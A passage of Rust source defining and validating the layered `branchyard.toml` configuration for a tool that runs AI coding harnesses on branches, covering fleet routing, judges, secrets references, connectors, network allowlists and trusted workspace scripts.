//! The project and user configuration file, `branchyard.toml`.
//!
//! One format at two levels: `~/.config/branchyard/config.toml` for a
//! person's defaults and `branchyard.toml` at a repository's root for the
//! project's. The project file overrides the user file key by key, the
//! `BRANCHYARD_*` variables override both, and command-line flags override
//! everything. [`parse`] reads a file strictly (`deny_unknown_fields`, then
//! the same parsers the flags use for secrets, MCP servers and effort), so a
//! typo is an error naming its line, never a silently ignored key.
//!
//! A file never holds a secret's value: `[secrets]` maps a secret's name to
//! the variable (`"VAR"`) or file (`"@path"`) that holds it.

use std::collections::BTreeMap;
use std::fmt;
use std::path::{Path, PathBuf};

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value};

/// The only file version this build reads.
pub const VERSION: u32 = 1;

/// The published JSON Schema, for editors (`#:schema` in generated files).
pub const SCHEMA_URL: &str =
    "https://raw.githubusercontent.com/vamsiramakrishnan/branchyard/main/schema/branchyard.config.json";

/// The project file's name, at the repository root.
pub const PROJECT_FILE: &str = "branchyard.toml";

/// A `branchyard.toml` or user `config.toml`.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
#[schemars(
    title = "Branchyard configuration",
    description = "Defaults for `by`: branchyard.toml at a repository root, or \
                   ~/.config/branchyard/config.toml. The project file overrides the user file, \
                   BRANCHYARD_* variables override both, flags override everything. Never holds a \
                   secret's value. See docs/setup.md."
)]
pub struct ProjectConfig {
    /// The file format's version; `1`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version: Option<u32>,
    /// Defaults for new branches (`by run`, `by fan`); `permissions` also
    /// applies to `send`, `fork`, `reincarnate` and `spawn`.
    #[serde(default, skip_serializing_if = "Defaults::is_empty")]
    pub defaults: Defaults,
    /// Secrets a new branch's harness is given, by name: `"VAR"` reads the
    /// variable VAR, `"@path"` a file. Never the value itself. Applied only
    /// to isolated or sandboxed branches, which have a private home.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub secrets: BTreeMap<String, String>,
    /// Stdio MCP servers for a new branch's harness: `NAME = "/absolute/command args"`.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub mcp: BTreeMap<String, String>,
    /// Where commands run: a Branchyard server instead of this machine.
    #[serde(default, skip_serializing_if = "Remote::is_empty")]
    pub remote: Remote,
    /// `by serve` defaults.
    #[serde(default, skip_serializing_if = "Serve::is_empty")]
    pub serve: Serve,
    /// Options for `provider = "microsandbox"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub microsandbox: Option<Microsandbox>,
    /// Telling you when a branch needs you or ends, from `by watch` and a
    /// waiting `by run`, `by fan`, `by send` or `by fork`.
    #[serde(default, skip_serializing_if = "Notify::is_empty")]
    pub notify: Notify,
    /// What prepares each new branch's worktree and cleans up after it
    /// (docs/workspace.md). Project file only; its scripts run only once
    /// you trust them (`by workspace trust`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<WorkspaceConfig>,
    /// Per-repository settings, keyed by the repository root's absolute
    /// path. User file only: `[projects."/src/app".workspace]` replaces
    /// that repository's own `[workspace]` for you.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub projects: BTreeMap<String, ProjectOverride>,
    /// Who runs each kind of task: `[fleet.bugfix]`, ..., and
    /// `[fleet.default]`. With a fleet, `by run` without `--harness` routes
    /// (docs/fleet.md). A project's entry replaces the user file's for the
    /// same kind.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub fleet: BTreeMap<String, FleetConfig>,
    /// The connector gateway (docs/connectors.md): where it is, which
    /// bundles it serves, how `by gateway` runs it, and the grants a new
    /// branch gets when `--connector` names none.
    #[serde(default, skip_serializing_if = "Connectors::is_empty")]
    pub connectors: Connectors,
    /// The hosts a new branch's harness may reach (docs/egress.md), when
    /// `--network` gives none: an allowlist enforced through Branchyard's
    /// egress proxy. Unset: open.
    #[serde(default, skip_serializing_if = "NetworkConfig::is_empty")]
    pub network: NetworkConfig,
    /// Quota meters per login (`by usage`, docs/usage.md): what `by run`
    /// and `by fan` do when a candidate's login is near its 5-hour or
    /// weekly limit, and named logins to meter.
    #[serde(default, skip_serializing_if = "UsageConfig::is_empty")]
    pub usage: UsageConfig,
    /// Issue trackers for `--issue` besides GitHub (docs/pull-requests.md):
    /// each one's API address and, instead of a token in the environment,
    /// a connector gateway tool to fetch issues through.
    #[serde(default, skip_serializing_if = "Trackers::is_empty")]
    pub trackers: Trackers,
    /// Environment recipes (docs/recipes.md): `[recipes.NAME]`, scripts
    /// that create, suspend, resume and destroy a machine and print how to
    /// reach it. A repository's recipes run only once you trust them (`by
    /// recipe trust NAME`); the user file's need no trust, and replace a
    /// repository's recipe of the same name.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub recipes: BTreeMap<String, RecipeConfig>,
    /// Repository knowledge (docs/knowledge.md): whether adopted entries
    /// are given to harnesses and within what budget, when branches are
    /// distilled into proposals, and by which distiller.
    #[serde(default, skip_serializing_if = "KnowledgeConfig::is_empty")]
    pub knowledge: KnowledgeConfig,
}

/// Orca's rule for a recipe's name: 1 to 64 lowercase letters, digits,
/// dots, underscores or hyphens, starting with a letter or digit.
pub fn valid_recipe_name(name: &str) -> bool {
    name.len() <= 64
        && name.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit())
        && name
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '.' | '_' | '-'))
}

/// One `[recipes.NAME]`, after Orca's `environmentRecipes` entries: shell
/// commands run in the repository root. `create` and `resume` print one
/// JSON object saying how to reach the machine; `suspend`, `resume` and
/// `destroy` get the machine's record on stdin.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct RecipeConfig {
    /// For people: what the machine is.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// Creates a machine and prints its result (docs/recipes.md).
    pub create: String,
    /// Freezes the machine; with `resume`, the provider's pause.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub suspend: Option<String>,
    /// Continues a suspended machine and prints its result again.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub resume: Option<String>,
    /// Releases the machine; `"none"` when it is cleaned up elsewhere.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub destroy: Option<String>,
    /// Checks this host can run the recipe (its CLI, credentials); exit 0
    /// is healthy. `by recipe check` runs it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub doctor: Option<String>,
    /// How long one script may run, in seconds (default 900).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub timeout_seconds: Option<u64>,
}

impl RecipeConfig {
    /// What the trust decision is about: SHA-256, in hex, of every command
    /// (and the timeout) in canonical form. Any change changes it.
    pub fn digest(&self) -> String {
        use sha2::{Digest, Sha256};
        let canonical = serde_json::json!({
            "create": self.create,
            "suspend": self.suspend,
            "resume": self.resume,
            "destroy": self.destroy,
            "doctor": self.doctor,
            "timeout_seconds": self.timeout_seconds,
        });
        hex::encode(Sha256::digest(canonical.to_string().as_bytes()))
    }

    /// Orca's rules for a recipe: a name of 1 to 64 lowercase letters,
    /// digits, dots, underscores or hyphens, starting with a letter or
    /// digit, and a `create` command.
    pub fn check(&self, name: &str) -> Result<(), ConfigError> {
        let key = format!("recipes.{name}");
        if !valid_recipe_name(name) {
            return Err(ConfigError(format!(
                "{key}: use 1-64 lowercase letters, numbers, dots, underscores or hyphens, \
                 starting with a letter or number"
            )));
        }
        if self.create.trim().is_empty() {
            return Err(ConfigError(format!("{key}.create: needs a command")));
        }
        for (field, value) in [
            ("suspend", &self.suspend),
            ("resume", &self.resume),
            ("destroy", &self.destroy),
            ("doctor", &self.doctor),
        ] {
            if value.as_deref().is_some_and(|v| v.trim().is_empty()) {
                return Err(ConfigError(format!("{key}.{field}: must not be empty")));
            }
        }
        if self.timeout_seconds == Some(0) {
            return Err(ConfigError(format!(
                "{key}.timeout_seconds: must be at least 1"
            )));
        }
        Ok(())
    }
}

/// `[knowledge]`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct KnowledgeConfig {
    /// Give matching adopted entries to each turn's harness, in its
    /// instructions. Default true.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provision: Option<bool>,
    /// At most about this many tokens of entries per turn. Default 1500.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub budget_tokens: Option<u32>,
    /// When a branch is distilled into proposed entries on its own: any of
    /// `merged`, `judged_best` and `ready`. Default `["merged",
    /// "judged_best"]`; `[]` only on `by knowledge distill`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub distill_on: Option<Vec<String>>,
    /// A harness that distills, read-only on a scratch branch, answering a
    /// JSON list of proposals. Without one, the deterministic extractor
    /// proposes the corrections and review comments a branch was sent.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub distiller: Option<DistillerConfig>,
}

impl KnowledgeConfig {
    pub fn is_empty(&self) -> bool {
        *self == KnowledgeConfig::default()
    }
}

/// `distiller = { harness = "claude-code", model = "small" }`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct DistillerConfig {
    /// The distiller's harness or profile ID.
    pub harness: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub effort: Option<String>,
    /// The executable and fixed arguments instead of the profile's; for
    /// development and testing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
}

/// The values `[knowledge] distill_on` takes.
pub const DISTILL_TRIGGERS: &[&str] = &["merged", "judged_best", "ready"];

/// `[usage]`.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct UsageConfig {
    /// What `by run` and `by fan` do when a candidate's login is near its
    /// limit: `warn` (the default), `refuse`, or `off`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub guard: Option<UsageGuard>,
    /// The percent of a 5-hour or weekly window at which a login counts as
    /// near its limit. Default 90.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0, max = 100.0))]
    pub near_percent: Option<f64>,
    /// The router (docs/fleet.md) skips a candidate whose login has used
    /// more than this percent of a window. Unset: it never skips one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0, max = 100.0))]
    pub skip_over: Option<f64>,
    /// Claude Code keeps no record of its limits on disk: the tokens a
    /// 5-hour window allows you, so `by usage` can show a percent. Unset: it
    /// shows tokens and cost only.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub claude_five_hour_tokens: Option<u64>,
    /// The same for Claude Code's weekly window.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub claude_weekly_tokens: Option<u64>,
    /// More logins to meter, by name: `[usage.accounts.work]` with the
    /// harness and the configuration directory it logs in from.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub accounts: BTreeMap<String, UsageAccount>,
}

impl UsageConfig {
    pub fn is_empty(&self) -> bool {
        self == &UsageConfig::default()
    }
}

/// `guard` in `[usage]`.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum UsageGuard {
    /// Say so on stderr, and start anyway.
    Warn,
    /// Refuse to start, naming the login and its window.
    Refuse,
    /// Do not look.
    Off,
}

/// `[usage.accounts.NAME]`: a login other than the default one.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct UsageAccount {
    /// `claude-code` or `codex`.
    pub harness: String,
    /// Its configuration directory: what `CLAUDE_CONFIG_DIR` or
    /// `CODEX_HOME` is set to when you use this login.
    pub dir: String,
}

/// `[trackers]`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Trackers {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub linear: Option<TrackerConfig>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub jira: Option<TrackerConfig>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gitlab: Option<TrackerConfig>,
}

impl Trackers {
    pub fn is_empty(&self) -> bool {
        self == &Trackers::default()
    }
}

/// One tracker in `[trackers]`. Never a credential: tokens come from the
/// environment (docs/pull-requests.md) or the connector gateway.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct TrackerConfig {
    /// The API's address: Linear's GraphQL endpoint, a Jira site
    /// (`https://acme.atlassian.net`) or a GitLab instance
    /// (`https://gitlab.example.com`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    /// Fetch issues through this connector gateway tool (such as
    /// `linear__get_issue`) when no token is in the environment; needs
    /// `[connectors] gateway`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gateway_tool: Option<String>,
}

/// The keys `[fleet]` takes: the task kinds, then `default`.
pub const FLEET_KEYS: &[&str] = &[
    "bugfix",
    "feature",
    "refactor",
    "review",
    "research",
    "docs",
    "migration",
    "tests",
    "other",
    "default",
];

/// The most attempts a fleet entry may ask for.
pub const MAX_ATTEMPTS: u32 = 16;

/// `[fleet.<kind>]`: the candidates for a kind of task, in order of
/// preference, and how they run.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct FleetConfig {
    /// Harnesses to route among, each with an optional model and effort.
    pub candidates: Vec<CandidateConfig>,
    /// Branches `by fan --auto` starts (best of N); `by run` starts one. Default 1.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1, max = 16))]
    pub attempts: Option<u32>,
    /// Each attempt's cost limit, in dollars, which a failover chain shares;
    /// a candidate whose recorded mean cost is over it is not picked.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0))]
    pub budget_usd: Option<f64>,
    /// Each attempt's turn limit.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub max_turns: Option<u32>,
    /// Interrupt an attempt's turn after this many minutes.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0))]
    pub max_minutes: Option<f64>,
    /// A judge harness for `by judge` and `by fan --judge`; without one the
    /// judge is deterministic.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub judge: Option<JudgeConfig>,
    /// Start the task again on the next candidate when a harness fails
    /// (not when the task does). `by run --auto` always does.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub failover: Option<bool>,
    /// The chance, from 0 to 1, that the router picks at random instead of
    /// by sampled success. Default 0.1.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0, max = 1.0))]
    pub exploration: Option<f64>,
    /// An environment name, recorded on routed branches for tools that
    /// prepare environments; Branchyard does not act on it yet.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub environment: Option<String>,
    /// Connector names, recorded on routed branches for tools that grant
    /// connectors; Branchyard does not act on them yet.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub connectors: Vec<String>,
    /// Plan first: a new branch of this kind starts with a read-only
    /// planning turn and waits for `by plan approve` (docs/plans-and-goals.md).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub plan: Option<bool>,
    /// The judge of a `--goal` for this kind of task, when the command names
    /// none: it runs read-only on a scratch branch and answers a JSON
    /// verdict (docs/plans-and-goals.md).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub goal_judge: Option<JudgeConfig>,
}

/// One candidate: `{ harness = "codex", model = "large", effort = "high" }`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct CandidateConfig {
    /// Harness or profile ID, as `by harnesses` lists them.
    pub harness: String,
    /// A model name, or a size alias (`small`, `medium`, `large`, `extra-large`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    /// Reasoning effort: `low`, `medium`, `high`, `xhigh`, or 0-100.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub effort: Option<String>,
    /// The executable and fixed arguments instead of the profile's, as
    /// `--command`; for development and testing.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
}

/// `judge = { harness = "claude-code", rubric = "..." }`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct JudgeConfig {
    /// The judge's harness or profile ID. It runs read-only on a scratch
    /// branch and must answer a JSON verdict.
    pub harness: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub effort: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
    /// Added to the judge's prompt, after the default rubric.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub rubric: Option<String>,
}

impl FleetConfig {
    /// The checks beyond the shape: `key` (`fleet.bugfix`) prefixes each
    /// message.
    pub fn check(&self, key: &str) -> Result<(), ConfigError> {
        let fail = |what: &str, why: String| Err(ConfigError(format!("{key}.{what}: {why}")));
        if self.candidates.is_empty() {
            return fail("candidates", "needs at least one candidate".into());
        }
        for (index, candidate) in self.candidates.iter().enumerate() {
            let at = format!("candidates[{index}]");
            check_harness(&candidate.harness).or_else(|why| fail(&format!("{at}.harness"), why))?;
            check_model_effort(candidate.model.as_deref(), candidate.effort.as_deref())
                .or_else(|(what, why)| fail(&format!("{at}.{what}"), why))?;
            check_command(candidate.command.as_deref())
                .or_else(|why| fail(&format!("{at}.command"), why))?;
            if self.candidates[..index].contains(candidate) {
                return fail(&at, "is listed twice".into());
            }
        }
        match self.attempts {
            Some(0) => return fail("attempts", "must be at least 1".into()),
            Some(n) if n > MAX_ATTEMPTS => {
                return fail(
                    "attempts",
                    format!("must be at most {MAX_ATTEMPTS}, not {n}"),
                )
            }
            _ => {}
        }
        for (what, value) in [
            ("budget_usd", self.budget_usd),
            ("max_minutes", self.max_minutes),
        ] {
            if let Some(value) = value {
                if !(value.is_finite() && value > 0.0) {
                    return fail(what, format!("must be a positive number, not {value}"));
                }
            }
        }
        if self.max_turns == Some(0) {
            return fail("max_turns", "must be at least 1".into());
        }
        if let Some(exploration) = self.exploration {
            if !(0.0..=1.0).contains(&exploration) {
                return fail(
                    "exploration",
                    format!("must be from 0 to 1, not {exploration}"),
                );
            }
        }
        for (name, judge) in [("judge", &self.judge), ("goal_judge", &self.goal_judge)] {
            let Some(judge) = judge else { continue };
            check_harness(&judge.harness).or_else(|why| fail(&format!("{name}.harness"), why))?;
            check_model_effort(judge.model.as_deref(), judge.effort.as_deref())
                .or_else(|(what, why)| fail(&format!("{name}.{what}"), why))?;
            check_command(judge.command.as_deref())
                .or_else(|why| fail(&format!("{name}.command"), why))?;
            if judge.rubric.as_deref().is_some_and(|r| r.trim().is_empty()) {
                return fail(&format!("{name}.rubric"), "must not be empty".into());
            }
        }
        if self
            .environment
            .as_deref()
            .is_some_and(|e| e.trim().is_empty())
        {
            return fail("environment", "must not be empty".into());
        }
        if let Some(bad) = self.connectors.iter().find(|c| c.trim().is_empty()) {
            return fail("connectors", format!("{bad:?} is not a connector name"));
        }
        Ok(())
    }
}

fn check_harness(harness: &str) -> Result<(), String> {
    match branchyard_harness::profiles::default_for(harness)
        .or_else(|| branchyard_harness::profiles::by_id(harness))
    {
        Some(_) => Ok(()),
        None => Err(format!(
            "{harness:?} is not a harness or profile; see `by harnesses`"
        )),
    }
}

fn check_model_effort(
    model: Option<&str>,
    effort: Option<&str>,
) -> Result<(), (&'static str, String)> {
    if model.is_some_and(|m| m.trim().is_empty()) {
        return Err(("model", "must not be empty".into()));
    }
    if let Some(effort) = effort {
        branchyard_provision::Effort::parse(effort).map_err(|e| ("effort", e))?;
    }
    Ok(())
}

fn check_command(command: Option<&str>) -> Result<(), String> {
    match command {
        Some(command) if split_words(command)?.is_empty() => Err("needs a command".into()),
        _ => Ok(()),
    }
}

/// `[connectors]`.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Connectors {
    /// The gateway's canonical `/mcp` URL, such as
    /// `http://127.0.0.1:8931/mcp`: every token's audience, and what a
    /// harness on this machine is given. Without it, connectors are off.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub gateway: Option<String>,
    /// The same gateway as a sandboxed harness reaches it: a host address a
    /// Microsandbox guest routes to, or Substrate's routed ingress. Without
    /// it, a sandboxed branch with a grant fails its turn.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sandbox_gateway: Option<String>,
    /// The bundle root the gateway serves (`anvil serve mcp <root>
    /// --fleet`): every directory under it with an `air.yaml` or
    /// `air.json` is a connector.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bundles: Option<String>,
    /// Anvil's command line (default `anvil`), such as
    /// `"node /opt/anvil/packages/cli/dist/bin-anvil.js"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub anvil: Option<String>,
    /// The address `by gateway start` listens on (default: the gateway
    /// URL's loopback host); `0.0.0.0` for sandboxes to reach it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub listen: Option<String>,
    /// The gateway's vault key, a 0600 file of 32 bytes in 64 hex
    /// characters (default `.branchyard/gateway/vault.key`, made on first
    /// start).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub vault_key: Option<String>,
    /// Grants for a new branch (`by run`, `by fan`) when `--connector`
    /// gives none, in its form: `"github:read"`,
    /// `"github@work:write:issues.*"`. Applied only to isolated or
    /// sandboxed branches.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub grants: Vec<String>,
}

impl Connectors {
    pub fn is_empty(&self) -> bool {
        self == &Connectors::default()
    }

    /// The default grants, parsed.
    pub fn grant_entries(
        &self,
    ) -> Result<Vec<branchyard_provision::connectors::GrantEntry>, ConfigError> {
        self.grants
            .iter()
            .map(|g| {
                branchyard_provision::connectors::GrantEntry::parse(g)
                    .map_err(|e| ConfigError(format!("connectors.grants: {e}")))
            })
            .collect()
    }
}

/// `[network]`.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct NetworkConfig {
    /// HOST[:PORT] rules a new branch's harness may reach, such as
    /// `"github.com"` or `"*.npmjs.org:443"`; `[]` allows nothing. Unset:
    /// every host (open). A connector grant adds the gateway.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub allow: Option<Vec<String>>,
    /// `best_effort` (the default): where the policy cannot be enforced,
    /// run with the proxy's variables and say so. `required`: refuse to
    /// run there.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enforce: Option<NetworkEnforceMode>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum NetworkEnforceMode {
    BestEffort,
    Required,
}

impl NetworkConfig {
    pub fn is_empty(&self) -> bool {
        self == &NetworkConfig::default()
    }

    /// The policy it describes, checked with the flag's parser; `None`
    /// when it describes none.
    pub fn policy(&self) -> Result<Option<branchyard_provision::network::Network>, ConfigError> {
        use branchyard_provision::network::{Enforce, Network};
        let enforce = match self.enforce {
            None | Some(NetworkEnforceMode::BestEffort) => Enforce::BestEffort,
            Some(NetworkEnforceMode::Required) => Enforce::Required,
        };
        let Some(allow) = &self.allow else {
            return match self.enforce {
                Some(NetworkEnforceMode::Required) => Err(ConfigError(
                    "network.enforce: an open network has nothing to enforce; give network.allow"
                        .into(),
                )),
                _ => Ok(None),
            };
        };
        Network::from_rules(allow, enforce)
            .map(Some)
            .map_err(|e| ConfigError(format!("network.allow: {e}")))
    }
}

/// A branch's workspace lifecycle: `[workspace]`.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct WorkspaceConfig {
    /// Globs, relative to the repository root, of untracked files copied
    /// into each new worktree, such as `.env` or `.env.*`. Never outside
    /// the repository; symbolic links are not copied.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub copy: Vec<String>,
    /// Run in each new worktree before its first turn: one command or a
    /// list, each with `sh -c`, stopping at the first that fails.
    #[serde(default, skip_serializing_if = "Script::is_empty")]
    pub setup: Script,
    /// Named commands `by workspace run [BRANCH] [NAME]` runs in a
    /// branch's worktree, such as a dev server on `$BRANCHYARD_PORT`.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub run: BTreeMap<String, RunScript>,
    /// Run in the worktree when the branch is removed (`by rm`, `by merge
    /// --rm`), best-effort.
    #[serde(default, skip_serializing_if = "Script::is_empty")]
    pub teardown: Script,
    /// Prepared environments (docs/environments.md): run `setup` once per
    /// environment key (a hash of the setup commands, the copy globs and
    /// the files `inputs` names) and keep what it produced under
    /// `.branchyard/environments/`; a new branch with the same key starts
    /// from it instead of running setup, cloned where the filesystem can.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub prepare: bool,
    /// Globs, relative to the repository root, of the files setup reads
    /// (lockfiles, manifests): their content is part of the environment
    /// key. Default: the common lockfiles and manifests present.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub inputs: Vec<String>,
    /// Directories setup produces that every branch with the same key
    /// shares, as a symbolic link to the prepared environment, instead of a
    /// copy of its own (`node_modules`). Literal relative paths.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub share: Vec<String>,
}

/// One command, or a list run in order.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(untagged)]
pub enum Script {
    One(String),
    Many(Vec<String>),
}

impl Default for Script {
    fn default() -> Script {
        Script::Many(Vec::new())
    }
}

impl Script {
    /// The commands, in order.
    pub fn commands(&self) -> Vec<String> {
        match self {
            Script::One(command) => vec![command.clone()],
            Script::Many(commands) => commands.clone(),
        }
    }

    pub fn is_empty(&self) -> bool {
        match self {
            Script::One(_) => false,
            Script::Many(commands) => commands.is_empty(),
        }
    }

    fn render(&self) -> String {
        match self {
            Script::One(command) => toml_string(command),
            Script::Many(commands) => {
                let items: Vec<String> = commands.iter().map(|c| toml_string(c)).collect();
                format!("[{}]", items.join(", "))
            }
        }
    }
}

/// A named command: `[workspace.run.NAME]`.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct RunScript {
    /// One command or a list, run with `sh -c` in the branch's worktree.
    pub command: Script,
    /// What `by workspace run` runs when given no name; at most one.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub default: bool,
}

/// `[projects."<repository root>"]` in the user file.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct ProjectOverride {
    /// Replaces the repository's own `[workspace]` whole, for you, with no
    /// trust step: it is your own file.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<WorkspaceConfig>,
}

/// Which file a configuration came from, for the checks only one of them
/// takes.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Layer {
    /// `~/.config/branchyard/config.toml`.
    User,
    /// `branchyard.toml` at a repository root.
    Project,
}

impl Layer {
    /// A file named `branchyard.toml` is a project file; any other, the
    /// user file.
    pub fn of(path: &Path) -> Layer {
        match path.file_name().and_then(|n| n.to_str()) == Some(PROJECT_FILE) {
            true => Layer::Project,
            false => Layer::User,
        }
    }
}

impl WorkspaceConfig {
    /// The checks beyond the shape: `key` prefixes each message.
    pub fn check(&self, key: &str) -> Result<(), ConfigError> {
        let fail = |what: String, why: &str| Err(ConfigError(format!("{key}.{what}: {why}")));
        for pattern in &self.copy {
            if let Err(why) = check_copy_glob(pattern) {
                return fail("copy".into(), &format!("{pattern:?} {why}"));
            }
        }
        for (what, script) in [("setup", &self.setup), ("teardown", &self.teardown)] {
            check_script(script).or_else(|why| fail(what.into(), &why))?;
        }
        if self.prepare && self.setup.is_empty() {
            return fail(
                "prepare".into(),
                "prepares the environment setup builds, so it needs setup",
            );
        }
        for (what, set) in [("inputs", &self.inputs), ("share", &self.share)] {
            if !set.is_empty() && !self.prepare {
                return fail(what.into(), "is only used with prepare = true");
            }
        }
        for pattern in &self.inputs {
            if let Err(why) = check_copy_glob(pattern) {
                return fail("inputs".into(), &format!("{pattern:?} {why}"));
            }
        }
        for path in &self.share {
            if let Err(why) = check_share_path(path) {
                return fail("share".into(), &format!("{path:?} {why}"));
            }
        }
        let mut defaults = Vec::new();
        for (name, run) in &self.run {
            let valid = !name.is_empty()
                && name.len() <= 64
                && name.starts_with(|c: char| c.is_ascii_alphanumeric())
                && name
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
            if !valid {
                return fail(
                    format!("run.{name}"),
                    "a run script's name is letters, digits, '-' and '_'",
                );
            }
            if run.command.is_empty() {
                return fail(format!("run.{name}.command"), "needs a command");
            }
            check_script(&run.command).or_else(|why| fail(format!("run.{name}.command"), &why))?;
            if run.default {
                defaults.push(name.clone());
            }
        }
        if defaults.len() > 1 {
            return fail(
                "run".into(),
                &format!(
                    "only one run script may be the default, not {}",
